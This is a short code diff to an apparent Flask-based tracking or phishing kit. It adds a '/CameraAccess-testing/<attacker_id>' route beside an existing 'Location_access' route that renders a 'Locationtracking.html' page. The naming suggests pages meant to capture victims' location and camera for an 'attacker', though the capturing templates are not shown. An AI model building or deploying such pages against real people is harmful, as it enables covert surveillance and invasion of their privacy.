@@ -97,6 +97,11 @@ def Location_access(attacker_id):
     return render_template('Locationtracking.html', attacker_id=attacker_id)
 
 
+@app.route('/CameraAccess-testing/<attacker_id>')
+def Camera_access(attacker_id):
+    return render_template('snapchart.html', attacker_id=attacker_id)
+
+
 @app.route('/access', methods=['POST'])
 def access():
     Access_Platform = request.form['Access_Platform']
